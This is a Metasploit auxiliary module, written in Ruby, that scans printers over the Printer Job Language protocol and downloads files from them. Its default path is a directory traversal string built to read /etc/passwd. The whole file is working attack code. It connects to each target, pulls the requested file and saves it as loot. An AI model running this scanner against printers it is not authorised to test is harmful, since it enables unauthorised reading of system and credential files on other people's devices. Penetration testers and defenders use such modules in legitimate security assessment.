##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require "msf/core"
require "rex/proto/pjl"

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      "Name" => "Printer File Download Scanner",
      "Description" => %q{
        This module downloads a file from a set of printers using the
        Printer Job Language (PJL) protocol.
      },
      "Author" => [
        "wvu", # Rex::Proto::PJL and modules
        "sinn3r", # RSpec tests
        "MC", # Independent mixin and modules
        "Myo Soe", # Independent modules
        "Matteo Cantoni <goony[at]nothink.org>" # Independent modules
      ],
      "References" => [
        ["URL", "https://en.wikipedia.org/wiki/Printer_Job_Language"]
      ],
      "License" => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
      OptString.new("PATHNAME", [true, "Pathname", '0:\..\..\..\etc\passwd'])
    ], self.class)
  end

  def run_host(ip)
    pathname = datastore["PATHNAME"]

    connect
    pjl = Rex::Proto::PJL::Client.new(sock)
    pjl.begin_job

    pjl.fsinit(pathname[0..1])
    file = pjl.fsupload(pathname)

    pjl.end_job
    disconnect

    if file
      res = store_loot(
        "printer.file",
        "application/octet-stream",
        ip,
        file,
        pathname,
        "Printer file"
      )
      print_good("#{ip}:#{rport} - Saved #{pathname} as #{res}")
    end
  end

end
